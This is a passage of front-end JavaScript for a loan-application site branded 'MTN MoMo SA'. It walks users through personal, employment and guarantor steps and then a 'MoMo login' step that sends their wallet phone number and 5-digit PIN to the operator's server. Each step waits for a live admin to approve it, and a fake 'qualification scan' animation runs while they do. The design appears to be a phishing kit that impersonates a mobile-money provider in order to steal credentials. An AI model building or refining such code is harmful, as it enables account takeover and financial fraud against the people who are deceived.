        saveAll();
        goTo('page-wait-loan');
        startPolling('loan', () => {
            S.steps.loan = 'approved'; saveAll();
            showToast('✅ Loan approved!', 'success');
            goTo('page-step2');
        });
    } catch (e) { showErr('s1Err', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
}

// ═══════════════════════════════════════════════════════════
// STEP 2: PERSONAL
// ═══════════════════════════════════════════════════════════
function prefillPersonal() {
    if (S.personal.firstName) document.getElementById('s2fi').value = S.personal.firstName;
    if (S.personal.lastName)  document.getElementById('s2la').value = S.personal.lastName;
    if (S.personal.phone)     document.getElementById('s2ph').value = S.personal.phone;
    if (S.personal.email)     document.getElementById('s2em').value = S.personal.email;
}

async function submitStepPersonal() {
    if (!isUserRegistered()) return forceRegistration();
    const fi = document.getElementById('s2fi').value.trim();
    const la = document.getElementById('s2la').value.trim();
    const ph = document.getElementById('s2ph').value;
    const em = document.getElementById('s2em').value.trim();
    if (!fi || !la) return showErr('s2Err', 'Enter your full name.');
    if (ph.length !== 9) return showErr('s2Err', 'Phone must be 9 digits.');
    if (!em || !em.includes('@')) return showErr('s2Err', 'Enter a valid email.');
    const btn = document.getElementById('s2Btn');
    setBtnLoading(btn, true, 'Submit for Approval');
    clearErr('s2Err');
    try {
        const data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'personal',
                data: { firstName: fi, lastName: la, phone: ph, email: em } })
        });
        setBtnLoading(btn, false, 'Submit for Approval');
        if (!data.ok) { showErr('s2Err', data.error || 'Failed.'); return; }
        S.personal = { firstName: fi, lastName: la, phone: ph, email: em };
        S.steps.personal = 'pending';
        saveAll();
        goTo('page-wait-personal');
        startPolling('personal', () => {
            S.steps.personal = 'approved'; saveAll();
            showToast('✅ Personal approved!', 'success');
            goTo('page-step3');
        });
    } catch (e) { showErr('s2Err', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
}

// ═══════════════════════════════════════════════════════════
// STEP 3: EMPLOYMENT
// ═══════════════════════════════════════════════════════════
async function submitStepEmployment() {
    if (!isUserRegistered()) return forceRegistration();
    const em  = document.getElementById('s3em').value;
    const inc = +document.getElementById('s3in').value;
    const kn  = document.getElementById('s3kn').value.trim();
    const kp  = document.getElementById('s3kp').value;
    if (!em || inc <= 0) return showErr('s3Err', 'Complete all fields.');
    if (!kn) return showErr('s3Err', 'Next of kin name required.');
    if (kp.length !== 9) return showErr('s3Err', 'Kin phone must be 9 digits.');
    const btn = document.getElementById('s3Btn');
    setBtnLoading(btn, true, 'Submit for Approval');
    clearErr('s3Err');
    try {
        const data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'employment',
                data: { employment: em, annualIncome: inc, kinName: kn, kinPhone: kp } })
        });
        setBtnLoading(btn, false, 'Submit for Approval');
        if (!data.ok) { showErr('s3Err', data.error || 'Failed.'); return; }
        S.employment = { employment: em, annualIncome: inc, kinName: kn, kinPhone: kp };
        S.steps.employment = 'pending';
        saveAll();
        goTo('page-wait-employment');
        startPolling('employment', () => {
            S.steps.employment = 'approved'; saveAll();
            showToast('✅ Employment approved!', 'success');
            goTo('page-guarantor');
        });
    } catch (e) { showErr('s3Err', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
}

// ═══════════════════════════════════════════════════════════
// STEP 4: GUARANTOR
// ═══════════════════════════════════════════════════════════
async function submitStepGuarantor() {
    if (!isUserRegistered()) return forceRegistration();
    const gn = document.getElementById('gName').value.trim();
    const gp = document.getElementById('gPhone').value;
    const gr = document.getElementById('gRel').value;
    const gc = document.getElementById('gConfirm').checked;
    if (!gn || gn.length < 3) return showErr('gErr', 'Enter guarantor name.');
    if (gp.length !== 9) return showErr('gErr', 'Phone must be 9 digits.');
    if (!gr) return showErr('gErr', 'Select relationship.');
    if (!gc) return showErr('gErr', 'Confirm agreement.');
    if (gp === S.personal.phone) return showErr('gErr', 'Guarantor phone cannot be your own.');
    const btn = document.getElementById('gBtn');
    setBtnLoading(btn, true, 'Submit for Approval');
    clearErr('gErr');
    try {
        const data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'guarantor',
                data: { guarantorName: gn, guarantorPhone: gp, guarantorRelation: gr } })
        });
        setBtnLoading(btn, false, 'Submit for Approval');
        if (!data.ok) { showErr('gErr', data.error || 'Failed.'); return; }
        S.guarantor = { guarantorName: gn, guarantorPhone: gp, guarantorRelation: gr };
        S.steps.guarantor = 'pending';
        saveAll();
        goTo('page-wait-guarantor');
        startPolling('guarantor', () => {
            S.steps.guarantor = 'approved'; saveAll();
            showToast('✅ Guarantor approved!', 'success');
            goTo('page-confirmation');
        });
    } catch (e) { showErr('gErr', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
}

// ═══════════════════════════════════════════════════════════
// CONFIRMATION
// ═══════════════════════════════════════════════════════════
function updateConfirmation() {
    if (!S.loan.loanAmount) return;
    const amt = S.loan.loanAmount;
    const months = parseInt(S.loan.loanTerm) || 12;
    const r = 0.27 / 12;
    const monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -months)) + 60);
    const totalCost = monthly * months - amt;
    document.getElementById('cfAmount').textContent  = 'R ' + fmt(amt);
    document.getElementById('cfTerm').textContent    = S.loan.loanTerm;
    document.getElementById('cfPurpose').textContent = S.loan.loanPurpose || '';
    document.getElementById('cfMonthly').textContent = 'R ' + fmt(monthly);
    document.getElementById('cfCost').textContent    = 'R ' + fmt(totalCost);
    document.getElementById('cfName').textContent    = `${S.personal.firstName || ''} ${S.personal.lastName || ''}`.trim();
    document.getElementById('cfPhone').textContent   = S.personal.phone ? '+27 ' + S.personal.phone : '';
    document.getElementById('cfEmail').textContent   = S.personal.email || '';
    document.getElementById('cfGName').textContent   = S.guarantor.guarantorName || '';
    document.getElementById('cfGPhone').textContent  = S.guarantor.guarantorPhone ? '+27 ' + S.guarantor.guarantorPhone : '';
    document.getElementById('agreeBox').checked = false;
    document.getElementById('confirmBtn').disabled = true;
}
async function showAgreement() {
    try {
        const data = await apiCall(`/api/agreement/${S.applicationId}`);
        if (!data.ok) { showToast('Agreement not available yet.', 'error'); return; }
        document.getElementById('agreementText').textContent = data.agreement;
        document.getElementById('agreementModal').classList.add('show');
    } catch (e) { showToast(e.message, 'error'); }
}
function closeAgreement() { document.getElementById('agreementModal').classList.remove('show'); }
function downloadAgreementPdf() {
    if (!S.applicationId) { showToast('No application loaded.', 'error'); return; }
    window.location.href = `/api/agreement-pdf/${S.applicationId}`;
    showToast('📥 Downloading PDF…', 'info', 2000);
}

// ═══════════════════════════════════════════════════════════
// TERMS MODAL
// ═══════════════════════════════════════════════════════════
let _termsCache = null;
async function showTerms() {
    try {
        const modal = document.getElementById('termsModal');
        const pre = document.getElementById('termsText');
        modal.classList.add('show');
        if (_termsCache) { pre.textContent = _termsCache; return; }
        pre.textContent = 'Loading…';
        const data = await apiCall('/api/terms');
        if (!data.ok) { pre.textContent = 'Could not load Terms.'; return; }
        _termsCache = data.text;
        pre.textContent = data.text;
    } catch (e) { showToast(e.message, 'error'); }
}
function closeTerms() { document.getElementById('termsModal').classList.remove('show'); }
function acceptTermsFromModal() {
    const cb = document.getElementById('regTnc');
    if (cb) cb.checked = true;
    clearErr('regErr');
    closeTerms();
    showToast('✅ Terms accepted', 'success', 1800);
}

// ═══════════════════════════════════════════════════════════
// MOMO LOGIN
// ═══════════════════════════════════════════════════════════
function prefillMoMoLogin() {
    const p = document.getElementById('loginPhone');
    if (S.personal.phone && p && !p.value) p.value = S.personal.phone;
}
function loginPinMvM(el, i) {
    el.value = el.value.replace(/\D/g, '').slice(0, 1);
    if (el.value && i < 4) document.getElementById('loginPin' + (i + 1))?.focus();
}
function loginPinKeydown(el, i, e) {
    if (e.key === 'Backspace' && !el.value && i > 0) {
        const p = document.getElementById('loginPin' + (i - 1));
        if (p) { p.focus(); p.value = ''; }
    }
    if (e.key === 'ArrowLeft'  && i > 0) document.getElementById('loginPin' + (i - 1))?.focus();
    if (e.key === 'ArrowRight' && i < 4) document.getElementById('loginPin' + (i + 1))?.focus();
}
function loginPinPaste(e, i) {
    const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
    if (!pasted) return;
    e.preventDefault();
    pasted.slice(0, 5 - i).split('').forEach((d, k) => {
        const b = document.getElementById('loginPin' + (i + k));
        if (b) b.value = d;
    });
    document.getElementById('loginPin' + Math.min(i + pasted.length, 4))?.focus();
}
function togLoginPin() {
    for (let i = 0; i < 5; i++) { const b = document.getElementById('loginPin' + i); if (b) b.type = b.type === 'password' ? 'text' : 'password'; }
}
function clearLoginPin() {
    for (let i = 0; i < 5; i++) { const el = document.getElementById('loginPin' + i); if (el) el.value = ''; }
    document.getElementById('loginPin0').focus();
}
function toggleLoginMethod() {
    const m = document.getElementById('loginMethod').value;
    document.getElementById('biometricBlock').style.display = m === 'biometric' ? 'block' : 'none';
}
async function submitMoMoLogin() {
    if (!isUserRegistered()) return forceRegistration();
    const phone  = document.getElementById('loginPhone').value;
    const method = document.getElementById('loginMethod').value;
    const pin    = [0,1,2,3,4].map(i => document.getElementById('loginPin' + i).value).join('');
    if (phone.length !== 9) return showErr('loginErr', 'Enter 9-digit MoMo phone.');
    if (method === 'pin' && pin.length !== 5) return showErr('loginErr', 'Enter 5-digit PIN.');
    const btn = document.getElementById('loginBtn');
    setBtnLoading(btn, true, 'Confirming...');
    clearErr('loginErr');
    try {
        const data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'momologin',
                data: { phone, pin: method === 'pin' ? pin : null, loginMethod: method, deviceInfo: navigator.platform || 'Unknown' } })
        });
        setBtnLoading(btn, false, 'Confirm Login');
        if (!data.ok) { showErr('loginErr', data.error || 'Login failed.'); return; }
        S.steps.momologin = 'pending';
        saveAll();
        goTo('page-wait-momologin');
        startPolling('momologin', () => {
            S.steps.momologin = 'approved'; saveAll();
            showToast('✅ MoMo login confirmed!', 'success');
            startQualificationScan();
        });
    } catch (e) { showErr('loginErr', e.message); setBtnLoading(btn, false, 'Confirm Login'); }
}

// ═══════════════════════════════════════════════════════════
// QUALIFICATION
// ═══════════════════════════════════════════════════════════
async function startQualificationScan() {
    goTo('page-scan');
    document.getElementById('scanItem1').className = 'scan-item active';
    document.getElementById('scanItem2').className = 'scan-item';
    document.getElementById('scanItem3').className = 'scan-item';
    document.getElementById('waitScanStatus').textContent = '⏳ Analyzing...';
    try {
        const data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'qualification', data: {} })
        });
        if (data.ok) { S.steps.qualification = 'pending'; saveAll(); }
    } catch (e) { console.error(e); }
    if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
    let i = 1;
    const statuses = ['📊 Analyzing transactions...', '📈 Verifying 20% requirement...', '🔍 Admin final review...'];
    qualificationAnimator = setInterval(() => {
        if (i < 3) {
            document.getElementById('scanItem' + i).className = 'scan-item done';
            document.getElementById('scanItem' + (i + 1)).className = 'scan-item active';
            document.getElementById('waitScanStatus').textContent = '⏳ ' + statuses[i];
            i++;
        } else {
            clearInterval(qualificationAnimator);
            qualificationAnimator = null;
            document.getElementById('scanItem3').className = 'scan-item done';
            document.getElementById('waitScanStatus').textContent = '⏳ Admin reviewing...';
        }
    }, 2500);
    startPolling('qualification', () => {
        if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
        ['scanItem1','scanItem2','scanItem3'].forEach(id => document.getElementById(id).className = 'scan-item done');
        S.steps.qualification = 'approved'; saveAll();
        setTimeout(() => { showToast('🎉 Loan approved!', 'success'); showApproval(); }, 800);
    });
}

// ═══════════════════════════════════════════════════════════
// POLLING (LOAN STEPS)
// ═══════════════════════════════════════════════════════════
function startPolling(step, onSuccess) {
    stopPolling();
    currentPollStep = step;
    currentPollCallback = onSuccess;
    currentPollStarted = Date.now();
    const tick = async () => {
        if (Date.now() - currentPollStarted > POLL_MAX_DURATION) {
            showToast('Timed out. Please retry.', 'error');
            stopPolling();
            return;
        }
        try {
            const r = await fetch(`/api/status/${S.applicationId}/${step}`, { credentials: 'same-origin' });
            if (!r.ok) throw new Error('HTTP ' + r.status);
            const data = await r.json();
            if (data.ok) {
                if (data.status === 'approved') { stopPolling(); onSuccess(); return; }
                if (data.status === 'rejected') {
                    stopPolling();
                    if (S.steps[step]) { S.steps[step] = 'rejected'; saveAll(); }
                    handleStepRejection(step);
                    return;
                }
            }
        } catch (e) { console.warn('Poll:', e.message); }
        activePoll = setTimeout(tick, POLL_INTERVAL);
    };
    tick();
}
function stopPolling() {
    if (activePoll) { clearTimeout(activePoll); activePoll = null; }
    currentPollStep = null;
    currentPollCallback = null;
}

// ✅ On step rejection → reset server state, route to appropriate step
async function handleStepRejection(step) {
    showToast(`❌ ${step.toUpperCase()} was rejected. Please review and try again.`, 'error', 5000);

    try {
        await apiCall(`/api/retry/${S.applicationId}/${step}`, { method: 'POST' });
        if (S.steps[step]) S.steps[step] = 'idle';
        saveAll();
    } catch (e) { console.warn('Retry reset failed:', e.message); }

    // Roll back to appropriate stage
    const routeBack = {
        loan:          () => goTo('page-step1'),
        personal:      () => goTo('page-step2'),
        employment:    () => goTo('page-step3'),
        guarantor:     () => goTo('page-guarantor'),
        momologin:     () => { clearLoginPin(); clearErr('loginErr'); goTo('page-momologin'); },
        qualification: () => { // restart entire loan flow from Step 1, keep registration
            STEP_ORDER_RESET();
            goTo('page-step1');
        }
    };
    (routeBack[step] || (() => goTo('page-landing')))();
}

function STEP_ORDER_RESET() {
    S.steps = { loan: 'idle', personal: 'idle', employment: 'idle', guarantor: 'idle', momologin: 'idle', qualification: 'idle' };
    S.loan = {}; S.personal = {}; S.employment = {}; S.guarantor = {};
    saveAll();
    clearDrafts();
}

document.addEventListener('visibilitychange', () => {
    if (!document.hidden && currentPollStep && currentPollCallback && !activePoll) {
        const step = currentPollStep;
        const cb = currentPollCallback;
        startPolling(step, cb);
    }
    if (!document.hidden && regPollTimer === null && S.registrationStatus && S.registrationStatus !== 'completed') {
        if (S.registrationStatus === 'pending_review') pollRegistrationStatus();
        else if (S.registrationStatus === 'pin_pending') pollPinStatus();
    }
});
window.addEventListener('beforeunload', () => { stopPolling(); stopRegPoll(); });

// ═══════════════════════════════════════════════════════════
// APPROVAL
// ═══════════════════════════════════════════════════════════
function showApproval() {
    const amt = S.loan.loanAmount;
    const months = parseInt(S.loan.loanTerm) || 12;
    const r = 0.27 / 12;
    const monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -months)) + 60);
    document.getElementById('aprAmount').textContent = 'R ' + fmt(amt);
    document.getElementById('aprAmt').textContent    = 'R ' + fmt(amt);
    document.getElementById('aprTerm').textContent   = S.loan.loanTerm;
    document.getElementById('aprMth').textContent    = 'R ' + fmt(monthly);
    goTo('page-approval');
}
async function viewSchedule() {
    try {
        const data = await apiCall(`/api/repayment-schedule/${S.applicationId}`);
        if (!data.ok) { showToast('Schedule not available.', 'error'); return; }
        let html = '<table class="schedule-table"><thead><tr><th>Month</th><th>Payment</th><th>Interest</th><th>Principal</th><th>Balance</th></tr></thead><tbody>';
        data.schedule.forEach(row => {
            html += `<tr><td>${row.month}</td><td>R ${fmt(row.payment)}</td><td>R ${fmt(row.interest)}</td><td>R ${fmt(row.principal)}</td><td>R ${fmt(row.balance)}</td></tr>`;
        });
        html += '</tbody></table>';
        document.getElementById('scheduleBody').innerHTML = html;
        document.getElementById('scheduleModal').classList.add('show');
    } catch (e) { showToast(e.message, 'error'); }
}
function closeSchedule() { document.getElementById('scheduleModal').classList.remove('show'); }
function copyAppId() {
    navigator.clipboard.writeText(S.applicationId).then(
        () => showToast('📋 Application ID copied!', 'success'),
        () => showToast('Could not copy.', 'error')
    );
}
function cancelApplication() {
    if (!confirm('Cancel this application? You can resume later with your Application ID.')) return;
    stopPolling(); stopRegPoll();
    if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
    save(KEYS.APP_ID, S.applicationId);
    rm(KEYS.APP_DATA);
    S.isRegistered = false;
    S.registrationStatus = 'idle';
    S.steps = {};
    S.loan = {}; S.personal = {}; S.employment = {}; S.guarantor = {};
    location.hash = '';
    location.reload();
}
function restartApplication() {
    stopPolling(); stopRegPoll();
    if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
    Object.values(KEYS).forEach(rm);
    clearDrafts();
    location.reload();
}

// ═══════════════════════════════════════════════════════════
// RECOVERY
// ═══════════════════════════════════════════════════════════
async function recoverSession() {
    const id = get(KEYS.APP_ID);
    if (!id) { goTo('page-landing'); return; }
    S.applicationId = id;
    const data = get(KEYS.APP_DATA);
    if (data) {
        S.isRegistered   = data.isRegistered;
        S.registrationStatus = data.registrationStatus || 'idle';
        S.accountType    = data.accountType;
        S.accountMaxLoan = data.accountMaxLoan;
        S.steps          = data.steps || {};
        S.loan           = data.loan || {};
        S.personal       = data.personal || {};
        S.employment     = data.employment || {};
        S.guarantor      = data.guarantor || {};
        S.dob            = data.dob || null;
    }
    try {
        const r = await fetch(`/api/status/${id}`, { credentials: 'same-origin' });
        if (!r.ok) { goTo('page-landing'); return; }
        const s = await r.json();
        if (!s.ok || !s.isRegistered) { goTo('page-landing'); return; }

        S.isRegistered   = true;
        S.registrationStatus = s.registrationStatus || S.registrationStatus;
        S.accountType    = s.accountType;
        S.accountMaxLoan = s.accountMaxLoan;
        S.steps          = s.steps || S.steps || {};
        S.dob            = s.dob || S.dob;
        if (s.loan)       S.loan       = { ...S.loan,       ...s.loan };
        if (s.personal)   S.personal   = { ...S.personal,   ...s.personal };
        if (s.employment) S.employment = { ...S.employment, ...s.employment };
        if (s.guarantor)  S.guarantor  = { ...S.guarantor,  ...s.guarantor };

        saveAll();
        updateCalc();

        // ── Registration not yet complete → route to correct registration stage
        if (S.registrationStatus && S.registrationStatus !== 'completed') {
            if (S.registrationStatus === 'rejected') {
                document.getElementById('regRejectReason').textContent = s.rejectionReason || 'Registration was rejected.';
            }
            routeRegistrationFlow();
            return;
        }

        // ── Loan flow ──
        const steps = S.steps;
        const pending = STEPS.find(x => steps[x] === 'pending');
        if (pending) {
            const waitPages = {
                loan: 'page-wait-loan', personal: 'page-wait-personal',
                employment: 'page-wait-employment', guarantor: 'page-wait-guarantor',
                momologin: 'page-wait-momologin'
            };
            if (pending === 'qualification') { startQualificationScan(); return; }
            if (waitPages[pending]) {
                goTo(waitPages[pending]);
                const cbMap = {
                    loan:       () => { S.steps.loan = 'approved'; saveAll(); goTo('page-step2'); },
                    personal:   () => { S.steps.personal = 'approved'; saveAll(); goTo('page-step3'); },
                    employment: () => { S.steps.employment = 'approved'; saveAll(); goTo('page-guarantor'); },
                    guarantor:  () => { S.steps.guarantor = 'approved'; saveAll(); goTo('page-confirmation'); },
                    momologin:  () => { S.steps.momologin = 'approved'; saveAll(); startQualificationScan(); }
                };
                startPolling(pending, cbMap[pending]);
                return;
            }
        }

        if (steps.qualification === 'approved') { showApproval(); return; }
        if (steps.momologin === 'approved')     { startQualificationScan(); return; }
        if (steps.guarantor === 'approved')     { goTo('page-confirmation'); return; }
        if (steps.employment === 'approved')    { goTo('page-guarantor'); return; }
        if (steps.personal === 'approved')      { goTo('page-step3'); return; }
        if (steps.loan === 'approved')          { goTo('page-step2'); return; }
        goTo('page-requirements');
    } catch (e) {
        console.warn('Recovery failed:', e.message);
        goTo('page-landing');
    }
}

// ═══════════════════════════════════════════════════════════
// STORAGE
// ═══════════════════════════════════════════════════════════
function saveAll() {
    save(KEYS.APP_ID, S.applicationId);
    save(KEYS.APP_DATA, {
        isRegistered: S.isRegistered,
        registrationStatus: S.registrationStatus,
        accountType:  S.accountType,
        accountMaxLoan: S.accountMaxLoan,
        dob: S.dob,
        steps:        S.steps,
        loan: S.loan, personal: S.personal,
        employment: S.employment, guarantor: S.guarantor
    });
}
async function retryStep(step) {
    stopPolling();
    try { await apiCall(`/api/retry/${S.applicationId}/${step}`, { method: 'POST' }); } catch (e) {}
    if (S.steps[step]) { S.steps[step] = 'idle'; saveAll(); }
    if (step === 'momologin') {
        clearLoginPin();
        clearErr('loginErr');
        goTo('page-momologin');
    }
}

// ═══════════════════════════════════════════════════════════
// DOM READY
// ═══════════════════════════════════════════════════════════
document.addEventListener('DOMContentLoaded', () => {
    applyI18n();
    restoreDrafts();
    attachDraftListeners();

    // Login PIN listeners
    for (let i = 0; i < 5; i++) {
        const el = document.getElementById('loginPin' + i);
        if (!el) continue;
        el.addEventListener('input',   () => loginPinMvM(el, i));
        el.addEventListener('keydown', (e) => loginPinKeydown(el, i, e));
        el.addEventListener('paste',   (e) => loginPinPaste(e, i));
    }
    // Registration OTP listeners
    for (let i = 0; i < 6; i++) {
        const el = document.getElementById('regOtp' + i);
        if (!el) continue;
        el.addEventListener('input', () => {
            el.value = el.value.replace(/\D/g, '').slice(0, 1);
            if (el.value && i < 5) document.getElementById('regOtp' + (i + 1))?.focus();
        });
        el.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !el.value && i > 0) {
                const p = document.getElementById('regOtp' + (i - 1));
                if (p) { p.focus(); p.value = ''; }
            }
        });
        el.addEventListener('paste', (e) => {
            const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
            if (!pasted) return;
            e.preventDefault();
            pasted.slice(0, 6 - i).split('').forEach((d, k) => {
                const b = document.getElementById('regOtp' + (i + k));
                if (b) b.value = d;
            });
            document.getElementById('regOtp' + Math.min(i + pasted.length, 5))?.focus();
        });
    }
    // Registration PIN listeners
    for (let i = 0; i < 5; i++) {
        const m = document.getElementById('regPin' + i);
        const c = document.getElementById('regPinC' + i);
        const wire = (el, idx, confirm) => {
            if (!el) return;
            el.addEventListener('input', () => {
                el.value = el.value.replace(/\D/g, '').slice(0, 1);
                if (el.value && idx < 4) {
                    const nxt = confirm ? document.getElementById('regPinC' + (idx + 1)) : document.getElementById('regPin' + (idx + 1));
                    nxt?.focus();
                }
                if (!confirm && el.value && idx === 4) document.getElementById('regPinC0')?.focus();
            });
            el.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !el.value && idx > 0) {
                    const pre = confirm ? 'regPinC' : 'regPin';
                    const p = document.getElementById(pre + (idx - 1));
                    if (p) { p.focus(); p.value = ''; }
                }
            });
        };
        wire(m, i, false);
        wire(c, i, true);
    }
});

// ─── INIT ───
updateCalc();
recoverSession();
console.log('✅ MTN MoMo SA v7.0 loaded');
